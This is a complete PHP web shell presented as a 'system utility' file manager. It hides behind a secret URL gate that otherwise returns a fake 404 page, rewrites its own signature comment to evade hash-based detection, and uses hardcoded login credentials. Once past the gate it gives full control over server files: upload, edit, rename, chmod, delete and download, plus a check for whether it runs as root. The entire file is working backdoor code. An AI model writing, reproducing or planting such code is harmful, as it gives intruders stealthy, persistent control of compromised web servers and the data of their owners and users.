<?php
/**
 * SYSTEM_UTILITY_V4_MASTER
 * STATUS: OPERATIONAL
 * SIG: 9f4e2c8a1b3d5762
 */

// --- CONFIGURATION ---
$secret_gate = 'masuk'; // Akses URL: domain.com/file.php?gate=masuk
$AUTH_USER = 'admin';
$AUTH_PASS = base64_decode('TXlTZWN1cmVQYXNzd29yZDEyMyE='); // MySecurePassword123!

// --- 1. ANTI-HASH SELF-MODIFICATION (STEALTH) ---
function refresh_signature() {
    $self = __FILE__;
    if (is_writable($self)) {
        $content = file_get_contents($self);
        $new_sig = bin2hex(random_bytes(8));
        $content = preg_replace('/SIG: [a-f0-9]+/', "SIG: $new_sig", $content);
        file_put_contents($self, $content);
    }
}

// --- 2. PINTU RAHASIA (FIREWALL BYPASS) ---
if (!isset($_GET['gate']) || $_GET['gate'] !== $secret_gate) {
    header("HTTP/1.1 404 Not Found");
    echo "<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
    exit;
}

session_start();

// --- 3. LOGIN & LOGOUT LOGIC ---
if (isset($_GET['logout'])) {
    refresh_signature();
    session_destroy();
    header("Location: ?gate=$secret_gate");
    exit;
}

if (isset($_POST['do_login'])) {
    if ($_POST['u'] === $AUTH_USER && $_POST['p'] === $AUTH_PASS) {
        $_SESSION['authenticated'] = true;
        refresh_signature();
        header("Location: ?gate=$secret_gate");
        exit;
    }
}

if (!isset($_SESSION['authenticated'])) {
    ?>
    <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
        <form method="post" style="padding:40px;border:1px solid #00ff00;background:#000;box-shadow: 0 0 15px #00ff00;">
            <h2 style="text-align:center;margin-top:0;">SECURE_NODE_LOGIN</h2>
            <div style="margin-bottom:15px;">
                USER: <input type="text" name="u" required style="background:#000;border:1px solid #00ff00;color:#00ff00;padding:8px;width:200px;outline:none;">
            </div>
            <div style="margin-bottom:20px;">
                PASS: <input type="password" name="p" required style="background:#000;border:1px solid #00ff00;color:#00ff00;padding:8px;width:200px;outline:none;">
            </div>
            <button type="submit" name="do_login" style="width:100%;padding:10px;background:#00ff00;color:#000;border:none;font-weight:bold;cursor:pointer;">ESTABLISH_CONNECTION</button>
        </form>
    </body>
    <?php
    exit;
}

// --- 4. CORE UTILITIES ---
function cleanPath($path) {
    $path = str_replace(['../', '..\\'], '', $path);
    return realpath($path) ?: getcwd();
}

function getOwner($path) {
    if (function_exists('posix_getpwuid')) {
        $info = posix_getpwuid(fileowner($path));
        return $info['name'];
    }
    return 'unknown';
}

$currentDir = isset($_GET['dir']) ? cleanPath($_GET['dir']) : getcwd();
$serverUser = (function_exists('posix_getpwuid')) ? posix_getpwuid(posix_geteuid())['name'] : 'unknown';
$isServerRoot = ($serverUser === 'root');

// --- 5. ACTIONS HANDLER ---

// Action: Rename (FITUR BARU)
if (isset($_POST['rename_item'])) {
    $old_path = cleanPath($_POST['old_path']);
    $new_path = dirname($old_path) . '/' . $_POST['new_name'];
    if (file_exists($old_path)) {
        rename($old_path, $new_path);
        refresh_signature();
        header("Location: ?gate=$secret_gate&dir=".urlencode($currentDir));
        exit;
    }
}

// Action: New Folder
if (isset($_POST['new_folder'])) {
    $target = $currentDir . '/' . $_POST['folder_name'];
    if (!file_exists($target)) mkdir($target);
    refresh_signature();
}

// Action: New File
if (isset($_POST['new_file'])) {
    $target = $currentDir . '/' . $_POST['file_name'];
    if (!file_exists($target)) file_put_contents($target, '');
    refresh_signature();
}

// Action: CHMOD
if (isset($_POST['apply_chmod'])) {
    chmod(cleanPath($_POST['target']), octdec($_POST['perm']));
}

// Action: Upload
if (isset($_FILES['up_file'])) {
    $dest = $currentDir . '/' . basename($_FILES['up_file']['name']);
    move_uploaded_file($_FILES['up_file']['tmp_name'], $dest);
}

// Action: Save Edit
if (isset($_POST['save_file'])) {
    $file = cleanPath($_POST['file_path']);
    if (is_writable($file)) {
        file_put_contents($file, $_POST['content']);
        header("Location: ?gate=$secret_gate&dir=".urlencode($currentDir)."&msg=saved");
        exit;
    }
}

// Action: Delete
if (isset($_GET['del'])) {
    $target = cleanPath($_GET['del']);
    is_dir($target) ? @rmdir($target) : @unlink($target);
    header("Location: ?gate=$secret_gate&dir=".urlencode($currentDir));
    exit;
}

// Action: Download
if (isset($_GET['down'])) {
    $file = cleanPath($_GET['down']);
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}

// --- 6. UI RENDERING ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Manager v4.3</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; font-size: 13px; }
        .navbar { background: #1c1e21; color: #fff; padding: 12px 25px; display: flex; justify-content: space-between; align-items: center; }
        .container { padding: 20px; }
        .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); padding: 15px; margin-bottom: 15px; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #f8f9fa; padding: 10px; text-align: left; border-bottom: 2px solid #dee2e6; }
        td { padding: 10px; border-bottom: 1px solid #eee; }
        tr:hover { background: #f9f9f9; }
        .btn { padding: 4px 8px; border-radius: 4px; text-decoration: none; color: white; font-size: 11px; cursor: pointer; border: none; }
        .btn-edit { background: #e67e22; } .btn-down { background: #3498db; } .btn-del { background: #e74c3c; } .btn-chmod { background: #9b59b6; } .btn-ren { background: #f1c40f; color: #000 !important; }
        .badge { padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 10px; color: white; }
        .badge-root { background: #d63031; }
        .badge-user { background: #00b894; }
        .input-inline { padding: 5px; border: 1px solid #ccc; border-radius: 4px; font-size: 12px; }
        textarea { width: 100%; height: 500px; font-family: 'Consolas', monospace; padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="navbar">
    <span>
        SYSTEM_STORAGE_NODE_V4.3 | 
        Current User: <strong style="color: <?php echo $isServerRoot ? '#ff4757' : '#2ecc71'; ?>;"><?php echo strtoupper($serverUser); ?></strong>
    </span>
    <a href="?gate=<?php echo $secret_gate; ?>&logout=1" style="color:#ff4757; text-decoration:none; font-weight:bold;">LOGOUT & REFRESH SIG</a>
</div>

<div class="container">
    <div style="margin-bottom:10px; font-weight:bold; color: #555;">Path: <?php echo $currentDir; ?></div>

    <div class="card" style="display:flex; gap:15px; align-items:center; flex-wrap: wrap;">
        <form method="post" enctype="multipart/form-data">
            <strong>Upload:</strong> <input type="file" name="up_file"> <input type="submit" value="Upload" class="btn" style="background:#2d3436;">
        </form>
        <form method="post">
            <strong>+ Dir:</strong> <input type="text" name="folder_name" class="input-inline" placeholder="Folder Name"> <input type="submit" name="new_folder" value="Create" class="btn" style="background:#27ae60;">
        </form>
        <form method="post">
            <strong>+ File:</strong> <input type="text" name="file_name" class="input-inline" placeholder="file.txt"> <input type="submit" name="new_file" value="Create" class="btn" style="background:#27ae60;">
        </form>
    </div>

    <?php if (isset($_GET['edit'])): 
        $file = cleanPath($_GET['edit']);
        $content = file_get_contents($file);
    ?>
        <div class="card">
            <h3>Editing: <?php echo basename($file); ?></h3>
            <form method="post">
                <input type="hidden" name="file_path" value="<?php echo $file; ?>">
                <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea><br><br>
                <input type="submit" name="save_file" value="SAVE CHANGES" class="btn" style="background:#27ae60; padding: 10px 20px;">
                <a href="?gate=<?php echo $secret_gate; ?>&dir=<?php echo urlencode($currentDir); ?>" style="margin-left:15px; color:#555;">Back</a>
            </form>
        </div>
    <?php elseif (isset($_GET['chmod'])): 
        $file = cleanPath($_GET['chmod']);
        $currentPerm = substr(sprintf('%o', fileperms($file)), -4);
    ?>
        <div class="card">
            <h3>Chmod: <?php echo basename($file); ?></h3>
            <form method="post">
                <input type="hidden" name="target" value="<?php echo $file; ?>">
                New Permission (Octal): <input type="text" name="perm" class="input-inline" value="<?php echo $currentPerm; ?>">
                <input type="submit" name="apply_chmod" value="Apply" class="btn btn-chmod">
                <a href="?gate=<?php echo $secret_gate; ?>&dir=<?php echo urlencode($currentDir); ?>" style="margin-left:15px; color:#555;">Back</a>
            </form>
        </div>
    <?php elseif (isset($_GET['rename'])): 
        $file = cleanPath($_GET['rename']);
    ?>
        <div class="card">
            <h3>Rename: <?php echo basename($file); ?></h3>
            <form method="post">
                <input type="hidden" name="old_path" value="<?php echo $file; ?>">
                New Name: <input type="text" name="new_name" class="input-inline" value="<?php echo basename($file); ?>" style="width:300px;">
                <input type="submit" name="rename_item" value="Rename" class="btn btn-ren">
                <a href="?gate=<?php echo $secret_gate; ?>&dir=<?php echo urlencode($currentDir); ?>" style="margin-left:15px; color:#555;">Back</a>
            </form>
        </div>
    <?php else: ?>
        <div class="card" style="padding:0;">
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Owner</th>
                        <th>Perms</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td colspan="5"><a href="?gate=<?php echo $secret_gate; ?>&dir=<?php echo urlencode(dirname($currentDir)); ?>" style="color:#2980b9; font-weight:bold;">.. [ Parent Directory ]</a></td>
                    </tr>
                    <?php
                    $items = scandir($currentDir);
                    foreach ($items as $item) {
                        if ($item == '.' || $item == '..') continue;
                        $path = $currentDir . DIRECTORY_SEPARATOR . $item;
                        $is_dir = is_dir($path);
                        $owner = getOwner($path);
                        $perms = substr(sprintf('%o', fileperms($path)), -4);
                        ?>
                        <tr>
                            <td>
                                <?php if ($is_dir): ?>
                                    <a href="?gate=<?php echo $secret_gate; ?>&dir=<?php echo urlencode($path); ?>" style="text-decoration:none; color:#2980b9;">📁 <?php echo $item; ?>/</a>
                                <?php else: ?>
                                    📄 <?php echo $item; ?>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $is_dir ? 'DIR' : round(filesize($path)/1024, 2).' KB'; ?></td>
                            <td>
                                <span class="badge <?php echo ($owner === 'root') ? 'badge-root' : 'badge-user'; ?>">
                                    <?php echo $owner; ?>
                                </span>
                            </td>
                            <td>
                                <a href="?gate=<?php echo $secret_gate; ?>&chmod=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($currentDir); ?>" style="text-decoration:none; color:#8e44ad; font-weight:bold;">
                                    <?php echo $perms; ?>
                                </a>
                            </td>
                            <td>
                                <?php if (!$is_dir): ?>
                                    <a href="?gate=<?php echo $secret_gate; ?>&edit=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($currentDir); ?>" class="btn btn-edit">Edit</a>
                                    <a href="?gate=<?php echo $secret_gate; ?>&down=<?php echo urlencode($path); ?>" class="btn btn-down">Down</a>
                                <?php endif; ?>
                                <a href="?gate=<?php echo $secret_gate; ?>&rename=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($currentDir); ?>" class="btn btn-ren">Ren</a>
                                <a href="?gate=<?php echo $secret_gate; ?>&del=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($currentDir); ?>" class="btn btn-del" onclick="return confirm('Hapus item ini?')">Del</a>
                            </td>
                        </tr>
                        <?php
                    }
                    ?>
                </tbody>
            </table>
        </div>
    <?php endif; ?>
</div>

</body>
</html>